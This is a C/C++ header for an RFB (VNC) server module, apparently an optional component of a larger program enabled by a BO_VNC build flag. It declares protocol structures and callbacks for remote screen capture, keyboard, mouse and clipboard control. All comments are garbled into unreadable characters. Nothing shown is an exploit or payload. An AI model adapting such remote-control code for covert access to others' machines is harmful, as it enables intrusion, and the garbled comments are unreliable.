/*
  �������� RFB.
  �� ������ http://www.uvnc.com/
*/
#pragma once

#if(BO_VNC > 0)
namespace Rfb
{
  //���� �����������.
  enum
  {
    ST_INVALID = 0,
    ST_NONE    = 1,
    ST_VNCAUTH = 2,
    ST_ERROR   = 0xFFFFFFFF
  };

  //���� �������.
  enum  
  {
    ENCODER_Raw         = 0, 
    ENCODER_Hextile     = 5,
    ENCODER_DesktopSize = 0xFFFFFF21
  };

  #pragma pack(push, 1)
  //������ �������.
  typedef struct
  {
    BYTE bBitsPerPixel;
    BYTE bDepth;
    BYTE bBigEndian;
    BYTE bTrueColour;
    
    WORD wRedMax;
    WORD wGreenMax;
    WORD wBlueMax;
    
    BYTE bRedShift;
    BYTE bGreenShift;
    BYTE bBlueShift;
    
    BYTE bPadding[3];
  }PIXEL_FORMAT;

  //��������� ServerInit.
  typedef struct
  {
    WORD wFrameBufferWidth;
    WORD wFrameBufferHeight;
    PIXEL_FORMAT pf;
    DWORD dwNameLength;
  }MSG_SERVERINIT;

  //���������� ��������.
  typedef struct
  {
    BYTE bIncremental;
    WORD wXPos;
    WORD wYPos;
    WORD wWidth;
    WORD wHeight;
  }RECTANGLE;

  typedef struct
  {
    WORD wXPos;
    WORD wYPos;
    WORD wWidth;
    WORD wHeight;
    DWORD dwEncodingType;
  }RECTANGLEEX;
  
  //������ � �������.
  typedef struct
  {
    BYTE bIsDown;
    BYTE pad[2];
    DWORD dwKeyCode;
  }EVENT_KEY;
  
  //������ � ���������.
  typedef struct
  {
    BYTE bButtonMask;
    WORD wXPos;
    WORD wYPos;
  }EVENT_POINTER;
  #pragma pack(pop)

  //������� ������ �������.
  typedef struct
  {
    HDC memoryDc;           //DC ��� ������.
    HBITMAP originalBitmap; //������� ������ memoryDc.

    WORD wWidth;
    WORD wHeight;
    DWORD dwWidthInBytes;

    HBITMAP hBitmap;
    LPBYTE pBmpDIB;
    LPBYTE pBmpDIBOld;
    void *pHextileBuffer; //���������� ����� ��� ������ Hextile.
    
    PIXEL_FORMAT pfLocalPixel;
    BYTE bLocalPixelSize;
    PIXEL_FORMAT pfRemotePixel;
    BYTE bRemotePixelSize;

    LPDWORD dwEncodingsList;       //������ �������, ������� ������������ ������
    WORD wEncodingsCount;          //���������� �������, ������� ������������ ������
    DWORD dwCurrentEncoder;        //������� �����.
    DWORD dwCurrentEncoderSwapped; //BigEndian �� ������.
  }INTERNAL_DATA;

  //��������� � ������ ���������, ������������� � ���� ������ �������.
  //����������: ��� WORD, DWORD ����������� � LITTLE ENDIAN (�.�. ���������).
  typedef struct 
  {
    void *param; //������������ �������� ��� �������.

    /*
      ��������� ������� ����������� �� �������.

      OUT securityType - ���� �� �������� ST_*. �� ��������� �������� ����� ST_NONE.
      OUT errorMessage - � ������ ���� *pdwSecurityType == ST_INVALID, ����������� ���������
                         �� ������, ����� ������������. ���������� *ppstrErrorMessage �� �����
                         ������������� �����������!
    */
    void (*onSecurityType)(void *param, LPDWORD securityType, LPSTR *errorMessage);
    
    /*
      ��������� �� ������� ��������� ClientInit.

      IN shared - ��������� ����� Shared-flag.

      Return    - true - ��� ����������� ������,
                  false - ��� ����������� ���������� ������.
    */
    bool (*onClientInit)(void *param, BYTE shared);
    
    /*
      ���������� ����� ��������� ��������� ServerInit.

      OUT name - ��������� �� ��� �������. ����� �� ����������� �������������!
      OUT size - ������ �����������.

      Return   - Memory DC - ����� ������������� ��� ������ �������, ����� ����������
                 ��������������.
                 NULL - ��� ����������� ���������� ������. 
   */
    HDC (*onServerInit)(void *param, LPSTR *name, POINT *size);

    /*
      ���������� � ������ ����������� �����������.
    */
    void (*OnUpdateDC)(void *pParam);

    /*
      ��������� ��������� �������.

      IN keySym - KeySym.
      IN down   - true - �������, false - ����������.
    */
    void (*onKeyEvent)(void *param, DWORD keySym, bool down);
    
    /*
      ��������� ��������� ���������.

      IN ..       - ������ ������ mouse_event.
    */
    void (*OnPointerEvent)(void *pParam, DWORD dwFlags, LONG wX, LONG wY, DWORD dwData);

    /*
      ������� ������.
      
      IN dwLen      - ������ ������.
      IN pstrString - ������.
    */
    void (*OnClientCutText)(void *pParam, DWORD dwLen, LPSTR pstrString);
  }SERVER_CALLBACKS;
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������ RFB ��������.

    IN s                 - �����.
    IN dwTimeout         - ������� �������� ������� �� �������, ��� 0 ��� ������������ ��������.
    IN pCallbacks        - ������ ������� �������.
    IN hDIBMap           - Map-file ��� �������, ��������� �������� ����� �����������, ��� NULL.
    IN updateMutex       - ������ ���������� ���������� �������, ��� NULL.
    IN dwRefreshInterval - �������� ����� ������� ��������� �����������.
  */
  void _ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks, HANDLE hDIBMap, DWORD mapOffset, HANDLE updateMutex, DWORD dwRefreshInterval);

  /*
    ��������� �������� ������ �� �������.

    IN s   - ����� �������.

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _SendBell(SOCKET s);
  
  /*
    ��������� "��������" ����� �������.
    
    IN s        - ����� �������.
    IN pstrText - ����� ��� ��������.

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _CopyText(SOCKET s, LPSTR pstrText);
};

#endif
